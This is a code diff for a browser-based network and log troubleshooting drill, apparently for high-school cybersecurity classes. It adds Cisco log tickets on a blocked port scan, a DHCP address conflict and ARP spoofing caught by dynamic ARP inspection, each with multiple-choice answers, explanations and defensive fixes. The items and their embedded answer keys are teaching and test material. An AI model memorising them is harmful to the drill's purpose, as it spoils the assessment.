+000413: Nov 23 13:02:11.121: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 198.51.100.77(40001) -> 203.0.113.2(23), 1 packet
+000414: Nov 23 13:02:11.125: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 198.51.100.77(40001) -> 203.0.113.2(445), 1 packet
+000415: Nov 23 13:02:11.130: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 198.51.100.77(40001) -> 203.0.113.2(3389), 1 packet
+000416: Nov 23 13:05:44.902: %LINK-3-UPDOWN: Interface GigabitEthernet0/2, changed state to up
+000417: Nov 23 13:07:11.131: %SEC-6-IPACCESSLOGP: list EDGE-IN denied tcp 198.51.100.77(40001) -> 203.0.113.2(22), 17 packets`]],
+  opts: ['One outside address swept four admin ports in 12 ms, and EDGE-IN denied every probe: a blocked port scan', 'An attacker got in over SSH', 'Inside PCs are infected and calling out', "The ACL blocks the school's web traffic"],
+  whys: ['Every line reads denied; a permit entry that logs would read permitted.',
+    "The source, 198.51.100.77, sits outside, and the target is the router's outside address: inbound probes.",
+    'The probes target 22, 23, 445, and 3389 on the router itself, and web traffic to 443 stays out of these lines.'],
+  why: 'Each IPACCESSLOGP line names the ACL, its action, and source(port) -> destination(port). One source trying four admin ports within 12 ms is a scan, and the 17 packets line is the five-minute count for SSH. Denied means the ACL worked: record it, and watch for a permitted line.',
+  cmd: ['show logging | include IPACCESSLOGP', 'show access-lists', 'show logging | include CONFIG_I', 'show running-config | include access-list'],
+  cwhy: 'It keeps the ACL hits, each with its source and destination.',
+  cwhys: ['It shows each entry with its match count, without who matched.', 'It keeps only config changes.', 'It shows the configured lists, without any hit.'],
+  fix: 'Every probe stopped at the edge, so record 198.51.100.77 and the time (13:02 UTC is 3:02 AM HST) as an indicator and keep watching.\nlogging host 10.1.20.50 sends each hit to the log server, where a rule can alert on a permitted line.' },
+{ id: 'lg-dhcp', cat: 'Cisco logs', title: 'The lab printer keeps vanishing',
+  sym: 'The Site A lab printer at 10.1.10.12 disappears for minutes at a time, and a Students laptop warned about an address conflict this morning.',
+  ev: [['RtrA buffered log (trimmed)', `000501: Nov 23 18:40:12.207: %DHCPD-4-PING_CONFLICT: DHCP address conflict:  server pinged 10.1.10.12.
+000502: Nov 23 18:41:55.803: %DHCPD-4-PING_CONFLICT: DHCP address conflict:  server pinged 10.1.10.12.`],
+    ['RtrA running-config (excerpt)', `ip dhcp excluded-address 10.1.10.1 10.1.10.9
+!
+ip dhcp pool STUDENTS
+ network 10.1.10.0 255.255.255.0
+ default-router 10.1.10.1
+ dns-server 10.1.20.50`],
+    ['Lab printer configuration page', `IPv4 Address:   10.1.10.12 (Manual)
+Subnet Mask:    255.255.255.0
+Gateway:        10.1.10.1`]],
+  opts: ['The printer holds a manual 10.1.10.12 inside the STUDENTS pool, so DHCP can hand the same address to a laptop', 'The DHCP pool ran out of addresses', "The printer's gateway is wrong", 'A rogue DHCP server hands out addresses'],
+  whys: ['An empty pool leaves clients on 169.254 addresses. PING_CONFLICT means the test ping got an answer.',
+    '10.1.10.1 matches default-router in the pool, the Site A gateway.',
+    "The conflict names one address that answered RtrA's own test ping, and the printer page shows it set by hand."],
+  why: "Before it offers an address, RtrA pings it; a reply logs %DHCPD-4-PING_CONFLICT and sets that address aside. The printer's manual 10.1.10.12 sits inside 10.1.10.0/24 and past the excluded .1 to .9, so a laptop can draw it while the printer sleeps.",
+  cmd: ['show logging | include DHCPD', 'show running-config | include dhcp', 'show logging | include IPACCESSLOGP', 'show ip interface brief'],
+  cwhy: 'It keeps the DHCP server messages, conflicts included.',
+  cwhys: ['It shows the pool settings, without any conflict.', 'It keeps only ACL hits.', 'It shows interface states, without DHCP.'],
+  fix: 'Give the printer an address the pool keeps free:\nip dhcp excluded-address 10.1.10.10 10.1.10.19\n(set the printer to 10.1.10.10, beside the other fixed addresses)\nThen renew the laptop: ipconfig /release, then ipconfig /renew' },
+{ id: 'lg-dai', cat: 'Cisco logs', title: 'One warning, over and over',
+  sym: "SwA's log has filled with the same warning since second period.",
+  ev: [['SwA buffered log (clock in UTC, trimmed)', `000611: Nov 23 19:19:58.402: %LINK-3-UPDOWN: Interface FastEthernet0/7, changed state to up
+000614: Nov 23 19:20:03.117: %SW_DAI-4-DHCP_SNOOPING_DENY: 1 Invalid ARPs (Res) on Fa0/7, vlan 10.([5c87.9c11.2233/10.1.10.1/3ca9.f412.7b5e/10.1.10.37/19:20:03 UTC Mon Nov 23 2026])
+000615: Nov 23 19:20:03.118: %SW_DAI-4-DHCP_SNOOPING_DENY: 1 Invalid ARPs (Res) on Fa0/7, vlan 10.([5c87.9c11.2233/10.1.10.37/001a.2b3c.4d01/10.1.10.1/19:20:03 UTC Mon Nov 23 2026])
+000616: Nov 23 19:20:05.120: %SW_DAI-4-DHCP_SNOOPING_DENY: 1 Invalid ARPs (Res) on Fa0/7, vlan 10.([5c87.9c11.2233/10.1.10.1/3ca9.f412.7b5e/10.1.10.37/19:20:05 UTC Mon Nov 23 2026])`]],
+  opts: ['The host on Fa0/7 sends forged ARP replies claiming the gateway, and DAI drops them', "RtrA's own ARP replies fail the check", 'DHCP snooping dropped server offers on the uplink', 'Port security shut Fa0/7'],
+  whys: ["RtrA's MAC is 001a.2b3c.4d01, behind the trunk. The sender here is 5c87.9c11.2233 on access port Fa0/7.",
+    'An uplink drop logs a DHCP_SNOOPING message naming DHCPOFFER. These are ARP replies, checked by DAI.',
+    'Port security logs PSECURE_VIOLATION and err-disables the port. Fa0/7 stays up while DAI drops packets one at a time.'],
+  why: "Dynamic ARP inspection checks each ARP on an untrusted port against the DHCP snooping table. Fa0/7's host claims 10.1.10.1 to the PC at 10.1.10.37 and 10.1.10.37 to RtrA, trying to sit on-path both ways, and DAI drops every reply.",
+  cmd: ['show logging | include DAI', 'show ip dhcp snooping binding', 'show logging | include PSECURE', 'show mac address-table'],
+  cwhy: 'It keeps the DAI drops, each naming the port, the VLAN, and the claimed addresses.',
+  cwhys: ['It lists the leases DAI checks against, without the drops.', 'It keeps only port security violations.', 'It maps MAC addresses to ports, without the forged replies.'],
+  fix: 'Shut Fa0/7 and find the device; DAI already keeps the forged replies from everyone else:\ninterface f0/7\nshutdown\nThen follow the acceptable-use policy for whoever plugged it in.' }
+];
+
 const CATS = ['Addressing', 'Physical', 'Switching', 'Device config', 'Services', 'Remote access', 'Access lists', 'Config accuracy'];
+const LCATS = ['Windows logs', 'Linux logs', 'Cisco logs'];
+const GRADES = ['Sophomore', 'Junior', 'Senior'];
 /* Grade tag and Defense Ladder links per ticket: [grade, [[unit hash, link text], ...], ticket ids] */
 const DL = 'https://freeapp4that.store/defense-ladder/#';
 const S5 = ['sophomore/s5', 'Defense Ladder s5, Cisco: configure a switch and a router'], J4 = ['junior/j4', 'Defense Ladder j4, Cisco: VLANs, routing, and ACLs'];
 const S7 = ['sophomore/s7', 'Defense Ladder s7, Network tools and a safer router'];
+const S10 = ['sophomore/s10', 'Defense Ladder s10, Read the logs: Windows, Linux, and network devices'];
+const S6 = ['sophomore/s6', 'Defense Ladder s6, Investigation questions and the change log'];
+const J3 = ['junior/j3', 'Defense Ladder j3, Debian and deeper Linux'], J8 = ['junior/j8', 'Defense Ladder j8, Windows: logons, tokens, and the event trail'];
 const TIERS = [
+  ['Sophomore', [S10], ['lg-lockout', 'lg-newadmin', 'lg-service', 'lg-logclear', 'lg-sshwin', 'lg-scan']],
+  ['Sophomore', [S10, S6], ['lg-useradd']],
+  ['Sophomore', [S10, ['sophomore/s3', 'Defense Ladder s3, Debian-family hardening']], ['lg-rootguess']],
+  ['Sophomore', [S10, S5], ['lg-config', 'lg-clock']],
+  ['Junior', [J8, ['junior/j2', 'Defense Ladder j2, Group Policy']], ['lg-task', 'lg-office']],
+  ['Junior', [J8], ['lg-localadmin', 'lg-rdp']],
+  ['Junior', [J3, S6], ['lg-sudo']],
+  ['Junior', [J3], ['lg-cron', 'lg-unit']],
+  ['Junior', [S10, J4], ['lg-flap', 'lg-aclscan', 'lg-dhcp']],
+  ['Junior', [['junior/j7', 'Defense Ladder j7, Read the wire: captures, flows, and network attacks'], J4], ['lg-dai']],
+  ['Senior', [['senior/se7', 'Defense Ladder se7, Windows: credentials and the domain attack surface']], ['lg-roast', 'lg-asrep']],
+  ['Senior', [['senior/se9', 'Defense Ladder se9, Linux: confine services and prove it']], ['lg-apparmor', 'lg-auid']],
   ['Sophomore', [['freshman/f4', 'Defense Ladder f4, Computers, virtualization, and the network']], ['apipa', 'dns']],
   ['Sophomore', [['freshman/f7', 'Defense Ladder f7, the Cables, link lights, and header sizes detail panel'], S5], ['cable']],
   ['Sophomore', [S5], ['admin', 'phys', 'svi', 'dgw', 'mode', 'netaddr', 'refused', 'nopw', 'keys', 'vlan', 'hostcase', 'bannertext', 'wrongif', 'bpduerr', 'duplex']],
   ['Sophomore', [S5, S7], ['gw']],
   ['Sophomore', [S7], ['icmp', 'arpspoof', 'linuxgw', 'linuxport']],
   ['Junior', [S5], ['mask', 'overlap', 'psec']],
-  ['Junior', [['junior/j3', 'Defense Ladder j3, Debian and deeper Linux'], J4], ['linuxdns']],
+  ['Junior', [J3, J4], ['linuxdns']],
   ['Junior', [J4], ['native', 'parent', 'allowed', 'encap', 'helper', 'acldir', 'defroute', 'studentnative', 'allowed30', 'vtyacl', 'snooptrust', 'vtpwipe', 'trunkencap']],
   ['Senior', [['senior/se6', 'Defense Ladder se6, Cisco: audit and extend the two-site network']], ['noredist', 'passivelink']]
 ];
 const TIER = {};
 TIERS.forEach(([grade, learn, ids]) => ids.forEach(id => { TIER[id] = { grade, learn }; }));
-const on = new Set(CATS);
+/* Two modes, each with its own deck, filters, stats, and best-streak key; the network key is the original one. */
+const MODES = {
+  net: { list: TICKETS, cats: CATS, best: 'netdrills.tickets.best',
+    lede: 'Read the complaint, study the real device output, and pick the root cause. Every ticket ends with the fix, including the ones where everything works yet the config still differs from the plan.' },
+  logs: { list: LOGS, cats: LCATS, best: 'netdrills.tickets.logs.best',
+    lede: 'Read the report, find the telling line in the log, and name what happened. Then pick the command that surfaces it on that system. Every ticket ends with the response.' }
+};
+const ALL = TICKETS.concat(LOGS);
+const MODE_KEY = 'netdrills.tickets.mode';
 const today = () => { const d = new Date(); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); };
 const DUE_KEY = 'netdrills.tickets.due';
-let deck = [], pos = 0, order = [], answered = false, missed = [];
-const S = { ok: 0, all: 0, streak: 0, best: Number(store.get('netdrills.tickets.best', 0)) || 0 };
+const ST = {};
+let mode = store.get(MODE_KEY, 'net') === 'logs' ? 'logs' : 'net';
+let on, grades, deck = [], pos = 0, order = [], order2 = [], answered = false, step = 1, firstRight = false, pick1 = null, missed = [], S;
+const kept = new Set(); /* modes whose review deck was kept for later during this visit */
+
+function load(m) {
+  if (!ST[m]) ST[m] = { on: new Set(MODES[m].cats), grades: new Set(GRADES), deck: [], pos: 0, missed: [], answered: false,
+    S: { ok: 0, all: 0, streak: 0, best: Number(store.get(MODES[m].best, 0)) || 0 } };
+  ({ on, grades, deck, pos, missed, answered, S } = ST[m]);
+}
+/* pick1 keeps an answered step 1, so a mode round trip reopens step 2 in place of a fresh try. */
+function save() { ST[mode] = { on, grades, deck, pos, missed, answered, S, pick1: step === 2 && !answered ? pick1 : null }; }
+const pool = () => MODES[mode].list.filter(t => on.has(t.cat) && grades.has(TIER[t.id].grade));
 
 function shuffle(a) {
   for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; }
@@ -1132,37 +1684,85 @@ function updStats() {
   $('#s-ok').textContent = S.ok; $('#s-all').textContent = S.all;
   $('#s-streak').textContent = S.streak; $('#s-best').textContent = S.best;
 }
-function renderChips() {
-  const box = $('#chips');
+function chipRow(box, items, set, count) {
   box.textContent = '';
-  CATS.forEach(c => {
-    const n = TICKETS.filter(t => t.cat === c).length;
+  items.forEach(c => {
     const b = document.createElement('button');
     b.type = 'button'; b.className = 'chip';
-    b.setAttribute('aria-pressed', on.has(c) ? 'true' : 'false');
-    b.textContent = `${c} (${n})`;
+    b.setAttribute('aria-pressed', set.has(c) ? 'true' : 'false');
+    b.textContent = `${c} (${count(c)})`;
     b.addEventListener('click', () => {
-      if (on.has(c) && on.size === 1) return;
-      if (on.has(c)) on.delete(c); else on.add(c);
+      if (set.has(c) && set.size === 1) return;
+      if (set.has(c)) set.delete(c); else set.add(c);
       renderChips();
-      startDeck(TICKETS.filter(t => on.has(t.cat)));
+      startDeck(pool());
     });
     box.append(b);
   });
 }
+function renderChips() {
+  const list = MODES[mode].list;
+  chipRow($('#chips'), MODES[mode].cats, on, c => list.filter(t => t.cat === c).length);
+  chipRow($('#gchips'), GRADES, grades, g => list.filter(t => TIER[t.id].grade === g).length);
+}
+function renderModes() {
+  $('#m-net').setAttribute('aria-pressed', mode === 'net' ? 'true' : 'false');
+  $('#m-logs').setAttribute('aria-pressed', mode === 'logs' ? 'true' : 'false');
+  $('#lede').textContent = MODES[mode].lede;
+}
 function startDeck(list) {
-  deck = shuffle(list.slice()); pos = 0; missed = [];
+  deck = shuffle(list.slice()); pos = 0; missed = []; answered = false;
+  if (!deck.length) {
+    $('#ticket').hidden = true;
+    const box = $('#end');
+    box.hidden = false;
+    box.innerHTML = '<h2>Empty deck</h2><p>This mix of ticket types and grades holds zero tickets. Turn on another type or grade.</p>';
+    return;
+  }
   $('#end').hidden = true; $('#ticket').hidden = false;
   show();
+}
+function setMode(m) {
+  if (m === mode) return;
+  save(); mode = m; store.set(MODE_KEY, m); load(m);
+  renderModes(); renderChips(); updStats(); renderReview();
+  if (!deck.length) { startDeck(pool()); return; }
+  if (answered) pos++;
+  $('#end').hidden = true; $('#ticket').hidden = false;
+  const p = ST[m].pick1;
+  show();
+  if (p != null && pos < deck.length) answer(p, true);
+}
+function buildOpts(fs, texts, pick, cls) {
+  fs.querySelectorAll('.opt').forEach(b => b.remove());
+  const o = shuffle([0, 1, 2, 3]);
+  o.forEach((oi, k) => {
+    const b = document.createElement('button');
+    b.type = 'button'; b.className = 'opt' + (cls ? ' ' + cls : ''); b.dataset.oi = oi;
+    b.innerHTML = '<span class="k" aria-hidden="true"></span><span></span>';
+    b.firstChild.textContent = k + 1;
+    b.lastChild.textContent = texts[oi];
+    b.addEventListener('click', () => pick(oi));
+    fs.append(b);
+  });
+  return o;
+}
+function markOpts(fs, oi) {
+  fs.querySelectorAll('.opt').forEach(b => {
+    const bi = Number(b.dataset.oi);
+    b.disabled = true;
+    if (bi === 0) b.classList.add('right');
+    else if (bi === oi) b.classList.add('wrong');
+  });
 }
 function show() {
   if (pos >= deck.length) { finish(); return; }
   const t = deck[pos];
-  answered = false;
+  answered = false; step = 1; pick1 = null;
   $('#t-no').textContent = `Ticket ${pos + 1} of ${deck.length}`;
   $('#t-cat').textContent = t.cat + (TIER[t.id] ? ' · ' + TIER[t.id].grade : '');
   $('#t-title').textContent = t.title;
-  $('#t-sym').textContent = '\u201C' + t.sym + '\u201D';
+  $('#t-sym').textContent = '“' + t.sym + '”';
   const ev = $('#t-ev');
   ev.textContent = '';
   t.ev.forEach(([label, text]) => {
@@ -1180,69 +1780,86 @@ function show() {
       }
     });
   });
-  const fs = $('#t-opts');
-  fs.querySelectorAll('.opt').forEach(b => b.remove());
-  order = shuffle([0, 1, 2, 3]);
-  order.forEach((oi, k) => {
-    const b = document.createElement('button');
-    b.type = 'button'; b.className = 'opt'; b.dataset.oi = oi;
-    b.innerHTML = '<span class="k" aria-hidden="true"></span><span></span>';
-    b.firstChild.textContent = k + 1;
-    b.lastChild.textContent = t.opts[oi];
-    b.addEventListener('click', () => answer(oi));
-    fs.append(b);
-  });
+  $('#t-opts legend').textContent = t.cmd ? 'Step 1 of 2: what happened?' : "What's the most likely cause?";
+  order = buildOpts($('#t-opts'), t.opts, answer);
   $('#t-res').hidden = true;
+  $('#t-opts2').hidden = true; $('#t-res2').hidden = true;
   $('#t-next').hidden = true;
 }
-function answer(oi) {
-  if (answered) return;
-  answered = true;
-  const t = deck[pos], right = oi === 0;
-  S.all++;
-  if (right) { S.ok++; S.streak++; if (S.streak > S.best) { S.best = S.streak; store.set('netdrills.tickets.best', S.best); } }
-  else { S.streak = 0; missed.push(t); }
-  document.querySelectorAll('#t-opts .opt').forEach(b => {
-    const bi = Number(b.dataset.oi);
-    b.disabled = true;
-    if (bi === 0) b.classList.add('right');
-    else if (bi === oi) b.classList.add('wrong');
-  });
-  const res = $('#t-res');
-  res.innerHTML = '<p class="verdict"></p><p class="why"></p><p class="fixl">Fix</p><pre class="fix"></pre>';
+/* Fill a result box: verdict, why, the reason the picked option misses, then (last step only) the fix and the course links. */
+function explain(res, t, o) {
+  res.innerHTML = '<p class="verdict"></p><p class="why"></p>' + (o.fixl ? '<p class="fixl"></p><pre class="fix"></pre>' : '');
   const v = res.querySelector('.verdict');
-  v.textContent = right ? 'Solved.' : 'Not this time. The answer outlined in green is the root cause.';
-  v.className = 'verdict ' + (right ? 'good' : 'nope');
-  res.querySelector('.why').textContent = t.why;
-  if (!right) {
-    const w = (OPTWHY[t.id] || [])[oi - 1];
-    if (w) {
-      const p = document.createElement('p'); p.className = 'picked';
-      const b = document.createElement('b'); b.textContent = 'What you picked: ';
-      const i = document.createElement('i'); i.textContent = t.opts[oi];
-      p.append(b, i, document.createTextNode('. ' + w));
-      res.insertBefore(p, res.querySelector('.fixl'));
+  v.textContent = o.verdict;
+  v.className = 'verdict ' + (o.right ? 'good' : 'nope');
+  res.querySelector('.why').textContent = o.why;
+  if (!o.right && o.w) {
+    const p = document.createElement('p'); p.className = 'picked';
+    const b = document.createElement('b'); b.textContent = 'What you picked: ';
+    const i = document.createElement('i'); i.textContent = o.picked;
+    p.append(b, i, document.createTextNode('. ' + o.w));
+    res.insertBefore(p, res.querySelector('.fixl'));
+  }
+  if (o.fixl) {
+    res.querySelector('.fixl').textContent = o.fixl;
+    res.querySelector('.fix').textContent = t.fix;
+    if (TIER[t.id]) {
+      const l = document.createElement('p');
+      l.className = 'learn';
+      l.textContent = 'Learn it: ';
+      TIER[t.id].learn.forEach(([hash, text], i) => {
+        if (i) l.append(' and ');
+        const a = document.createElement('a');
+        a.href = DL + hash; a.target = '_blank'; a.rel = 'noopener'; a.textContent = text;
+        l.append(a);
+      });
+      res.append(l);
     }
   }
-  res.querySelector('.fix').textContent = t.fix;
-  if (TIER[t.id]) {
-    const l = document.createElement('p');
-    l.className = 'learn';
-    l.textContent = 'Learn it: ';
-    TIER[t.id].learn.forEach(([hash, text], i) => {
-      if (i) l.append(' and ');
-      const a = document.createElement('a');
-      a.href = DL + hash; a.target = '_blank'; a.rel = 'noopener'; a.textContent = text;
-      l.append(a);
-    });
-    res.append(l);
-  }
   res.hidden = false;
+}
+function score(t, right) {
+  answered = true;
+  S.all++;
+  if (right) { S.ok++; S.streak++; if (S.streak > S.best) { S.best = S.streak; store.set(MODES[mode].best, S.best); } }
+  else { S.streak = 0; missed.push(t); }
   const nb = $('#t-next');
   nb.textContent = pos + 1 < deck.length ? 'Next ticket' : 'See results';
   nb.hidden = false;
   nb.focus({ preventScroll: true });
   updStats();
+}
+function answer(oi, quiet) {
+  if (answered || step !== 1) return;
+  const t = deck[pos], right = oi === 0;
+  markOpts($('#t-opts'), oi);
+  const w = (t.whys || OPTWHY[t.id] || [])[oi - 1];
+  if (!t.cmd) {
+    explain($('#t-res'), t, { right, verdict: right ? 'Solved.' : 'Not this time. The answer outlined in green is the root cause.', why: t.why, picked: t.opts[oi], w, fixl: 'Fix' });
+    score(t, right);
+    return;
+  }
+  firstRight = right; step = 2; pick1 = oi;
+  const res = $('#t-res');
+  explain(res, t, { right, verdict: right ? 'Right.' : 'Not this time. The answer outlined in green is what happened.', why: t.why, picked: t.opts[oi], w });
+  const fs = $('#t-opts2');
+  fs.querySelector('legend').textContent = t.q2 || 'Step 2 of 2: which command surfaces it on this system?';
+  order2 = buildOpts(fs, t.cmd, answer2, 'cmd');
+  fs.hidden = false;
+  fs.focus({ preventScroll: true });
+  if (quiet) return;
+  /* Bring step 2 up while the step 1 verdict stays on screen: scroll by the smaller of the two needs. */
+  const top = res.getBoundingClientRect().top, below = fs.getBoundingClientRect().bottom - innerHeight + 8;
+  const dy = top < 0 || top > innerHeight ? top - 8 : Math.max(0, Math.min(below, top - 8));
+  if (dy) window.scrollBy(0, dy);
+}
+function answer2(ci) {
+  if (answered || step !== 2) return;
+  const t = deck[pos], right = ci === 0;
+  markOpts($('#t-opts2'), ci);
+  explain($('#t-res2'), t, { right, verdict: right ? (firstRight ? 'Solved.' : 'Right command.') : 'Not this time. The command outlined in green surfaces it.',
+    why: t.cwhy, picked: t.cmd[ci], w: t.cwhys[ci - 1], fixl: 'Response' });
+  score(t, firstRight && right);
 }
 function finish() {
   $('#ticket').hidden = true;
@@ -1250,7 +1867,7 @@ function finish() {
   box.hidden = false;
   box.innerHTML = '<h2></h2><p></p><div class="actions"></div>';
   box.querySelector('h2').textContent = missed.length ? 'Deck done.' : 'Clean sweep.';
-  box.querySelector('p').textContent = `You solved ${solved} of ${deck.length} tickets on the first try.` + (missed.length ? ' Worth another look:' : ' Every root cause, first try.');
+  box.querySelector('p').textContent = `You solved ${solved} of ${deck.length} tickets on the first try.` + (missed.length ? ' Worth another look:' : mode === 'net' ? ' Every root cause, first try.' : ' Every finding and command, first try.');
   if (missed.length) {
     const ul = document.createElement('ul');
     missed.forEach(t => { const li = document.createElement('li'); li.textContent = `${t.title} (${t.cat})`; ul.append(li); });
@@ -1259,7 +1876,8 @@ function finish() {
   const acts = box.querySelector('.actions');
   if (missed.length) {
     const due = store.get(DUE_KEY, null) || { saved: today(), ids: [] };
-    missed.forEach(t => { if (!due.ids.includes(t.id)) due.ids.push(t.id); });
+    due.at = due.at || {};
+    missed.forEach(t => { if (!due.ids.includes(t.id)) due.ids.push(t.id); due.at[t.id] = today(); });
     store.set(DUE_KEY, due);
     const note = document.createElement('p'); note.className = 'later';
     note.textContent = 'A review right now is a warm-up: the answers are still fresh. These tickets come back as a review deck the next day you open this page.';
@@ -1274,40 +1892,52 @@ function finish() {
   const a = document.createElement('button');
   a.type = 'button'; a.className = 'btn' + (missed.length ? '' : ' primary');
   a.textContent = 'Shuffle the whole deck';
-  a.addEventListener('click', () => startDeck(TICKETS.filter(t => on.has(t.cat))));
+  a.addEventListener('click', () => startDeck(pool()));
   acts.append(a);
   box.scrollIntoView({ block: 'start' });
 }
 $('#t-next').addEventListener('click', () => { pos++; show(); $('#ticket').scrollIntoView({ block: 'start' }); });
+$('#m-net').addEventListener('click', () => setMode('net'));
+$('#m-logs').addEventListener('click', () => setMode('logs'));
 document.addEventListener('keydown', e => {
   if (e.altKey || e.ctrlKey || e.metaKey || $('#ticket').hidden) return;
-  if (!answered && /^[1-4]$/.test(e.key)) { answer(order[Number(e.key) - 1]); e.preventDefault(); }
+  if (/^(INPUT|TEXTAREA|SELECT)$/.test(e.target.tagName) || e.target.isContentEditable) return; /* typing in a field answers nothing */
+  if (!answered && /^[1-4]$/.test(e.key)) { const k = Number(e.key) - 1; if (step === 2) answer2(order2[k]); else answer(order[k]); e.preventDefault(); }
   else if (answered && e.key === 'Enter' && document.activeElement !== $('#t-next')) { $('#t-next').click(); e.preventDefault(); }
 });
+/* The due list holds missed ids from both modes, each dated in due.at (older lists date them all by due.saved).
+   Each mode reviews its own ids from an earlier day and leaves the rest in place. */
 function renderReview() {
   const box = $('#review'); if (!box) return;
-  const due = store.get(DUE_KEY, null);
-  const ids = due && Array.isArray(due.ids) ? due.ids.filter(id => TICKETS.some(t => t.id === id)) : [];
-  if (!ids.length || due.saved === today()) { box.hidden = true; return; }
+  const due = store.get(DUE_KEY, null), list = MODES[mode].list;
+  const when = id => (due.at && due.at[id]) || due.saved || '';
+  const ids = due && Array.isArray(due.ids) && !kept.has(mode) ? due.ids.filter(id => list.some(t => t.id === id) && when(id) < today()) : [];
+  if (!ids.length) { box.hidden = true; return; }
+  const days = [...new Set(ids.map(when))].sort();
   box.hidden = false;
   box.innerHTML = '<h2></h2><p></p><div class="actions"></div>';
   box.querySelector('h2').textContent = 'Review deck';
-  box.querySelector('p').textContent = `${ids.length} ticket${ids.length === 1 ? '' : 's'} you missed on ${due.saved} ${ids.length === 1 ? 'is' : 'are'} due for a second look. A right answer today, with the first one out of memory, is the real test.`;
+  box.querySelector('p').textContent = `${ids.length} ticket${ids.length === 1 ? '' : 's'} you missed ${days.length === 1 ? 'on ' + days[0] : 'between ' + days[0] + ' and ' + days[days.length - 1]} ${ids.length === 1 ? 'is' : 'are'} due for a second look. A right answer today, with the first one out of memory, is the real test.`;
   const b = document.createElement('button'); b.type = 'button'; b.className = 'btn primary'; b.textContent = 'Review them now';
-  b.addEventListener('click', () => { store.set(DUE_KEY, null); box.hidden = true; startDeck(TICKETS.filter(t => ids.includes(t.id))); $('#ticket').scrollIntoView({ block: 'start' }); });
+  b.addEventListener('click', () => {
+    const rest = due.ids.filter(id => !ids.includes(id) && ALL.some(t => t.id === id)), at = {};
+    rest.forEach(id => { at[id] = when(id); });
+    store.set(DUE_KEY, rest.length ? { saved: due.saved, ids: rest, at } : null);
+    box.hidden = true; startDeck(list.filter(t => ids.includes(t.id))); $('#ticket').scrollIntoView({ block: 'start' });
+  });
   const k = document.createElement('button'); k.type = 'button'; k.className = 'btn'; k.textContent = 'Keep for later';
-  k.addEventListener('click', () => { box.hidden = true; });
+  k.addEventListener('click', () => { kept.add(mode); box.hidden = true; });
   box.querySelector('.actions').append(b, k);
 }
-renderChips(); updStats(); renderReview();
-startDeck(TICKETS);
+load(mode); renderModes(); renderChips(); updStats(); renderReview();
+startDeck(pool());
 })();
 </script>
 <div id="termsbox" class="termsbox" hidden role="dialog" aria-label="Terms on this page"><h2>Terms on this page</h2><div class="trow"><input id="termsQ" type="search" placeholder="Filter terms" aria-label="Filter terms"><button type="button" id="termsDefine">Define selection</button><button type="button" id="termsClose">Close</button></div><p class="tdef" id="termsDef" role="status">Select a word on the page and press Define selection, or browse the list. Definitions come from the Defense Ladder glossary.</p><dl id="termsList"></dl></div>
 <script>
 /* Reading support (panel review, UDL): text size, read aloud, terms, and (Drills) a shared-computer banner. Same code in every practice page. */
 (function(){
-  const C={"key": "netdrills.trouble-tickets", "read": ["#review", "#ticket", "#end"], "gloss": [["Access port", "A switch port in one VLAN that passes untagged frames to one end device."], ["access-class", "The line command that filters which source addresses may open a session to the device itself."], ["APIPA", "A self-assigned 169.254.x.x address that a Windows host takes when its DHCP request goes unanswered."], ["ARP", "The protocol that finds the MAC address for an IPv4 address on the local network."], ["ARP spoofing", "Forged ARP replies that claim another host’s IP address, often the gateway’s, to put the sender on-path."], ["Autostate", "The rule that keeps an SVI down until its VLAN exists and a port carrying it is up."], ["Backup", "An independent copy on separate media that survives the loss of the original and earns trust after a test restore."], ["Baseline", "A record of how a system looks before you change it: its users, services, ports, software, and settings."], ["BPDU", "The message switches exchange to run spanning tree."], ["BPDU guard", "A setting that err-disables an edge port the moment a BPDU arrives."], ["Broadcast address", "The last address of a subnet, with every host bit set to 1."], ["CDP", "Cisco Discovery Protocol, which announces a device’s model, IOS version, and addresses to its neighbors."], ["Command Prompt", "cmd.exe, the older Windows command line, where commands such as dir and del, and tools such as sc.exe, netsh, and reg, take their own options (such as /s or start= disabled) in place of PowerShell parameters."], ["Compliance", "Meeting the laws, standards, and contracts that apply to an organization, and proving it with evidence."], ["Default gateway", "The router a host sends traffic to when the destination sits on another network."], ["Default route", "The 0.0.0.0/0 route that catches every destination missing from the routing table."], ["DHCP", "The service that hands hosts an address, mask, gateway, and DNS server automatically."], ["DHCP snooping", "A switch feature that lets DHCP server replies in only on trusted ports."], ["DNS", "The service that turns names into IP addresses."], ["DNSSEC", "Signatures on DNS records that let a validating resolver prove an answer is the zone owner’s, unchanged."], ["Duplex mismatch", "One end of a link sending and receiving at once (full duplex) while the other takes turns (half): the link stays up but slow, with collisions and CRC errors."], ["Dynamic ARP inspection", "A switch feature that checks ARP packets on untrusted ports against the DHCP snooping table to stop ARP poisoning."], ["enable secret", "The IOS line that guards privileged mode with a hashed password; enable password keeps it in clear text."], ["Encapsulation", "Wrapping data from the layer above in each layer’s own header on the way down the stack."], ["Err-disabled", "A port state in which the switch has shut the port for a violation until an admin removes the cause and cycles the port."], ["Evidence", "The files, logs, and settings an investigation question depends on, kept unchanged until the question is answered."], ["Gateway of last resort", "The show ip route line that names the default route’s next hop."], ["Hardening", "Shrinking a system’s attack surface by removing what is unneeded and securely configuring what remains."], ["Host route", "A /32 route that matches exactly one address."], ["HTTPS", "HTTP inside TLS on port 443: private and protected against tampering."], ["ICMP", "The IP helper protocol that carries error and test messages, such as ping."], ["Implicit deny", "The hidden last line of every ACL that drops every packet no earlier line matched."], ["JSON", "A data format of braces, brackets, and quoted keys, used in API answers, cloud policies, and audit events."], ["Key pair", "A public key anyone may hold and a matching private key only its owner keeps."], ["LAN", "Local area network: devices in one building or campus, joined by links the owner controls."], ["Loop", "Code that repeats the same lines for each item, such as each line of a file."], ["MAC address", "A 48-bit hardware address that carries a frame to the next device on the local link."], ["NAT", "Address translation that swaps a private source address for a public one at the network edge."], ["Native VLAN", "The one VLAN that crosses a trunk untagged; both ends must agree on it."], ["Network address", "The first address of a subnet, with every host bit set to 0."], ["O E2", "An OSPF external type 2 route, whose cost stays at its starting metric (20 by default)."], ["On-path attack", "An attack that puts a stranger between two parties to read or change what passes; once called man-in-the-middle."], ["OSPF", "A link-state routing protocol in which neighbors share routes inside areas; area 0 is the backbone."], ["Port security", "A switch feature that limits which, and how many, MAC addresses may use an access port."], ["PortFast", "A 